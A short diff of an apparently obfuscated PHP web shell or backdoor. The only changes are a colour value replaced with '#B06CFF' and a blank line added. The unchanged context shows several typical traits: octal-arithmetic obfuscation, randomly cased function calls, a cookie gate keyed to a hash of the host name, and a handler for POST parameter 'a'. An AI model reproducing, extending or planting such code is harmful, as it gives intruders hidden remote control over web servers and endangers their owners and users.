@@ -36,7 +36,7 @@ class _pps
     {
         $this->hsh = "fa704e7366d666bd";
         $this->_i = "_" . sUbSTr(mD5($_SERVER["HTTP_HOST"]), -056 - -0152 - 074, 075 + 0146 + -0240);
-        $this->_taj = "#d\1465";
+        $this->_taj = "#B06CFF";
         $this->_hej = "Windows-1251";
         if (!@isset($_COOKIE[$this->_i]) || ($_COOKIE[$this->_i] != $this->hsh)) $this->SetcOoK($this->_i, $this->hsh);
     }
@@ -456,4 +456,5 @@ if (@isset($_POST["a"])) {
         exit;
     }
 };
+
 
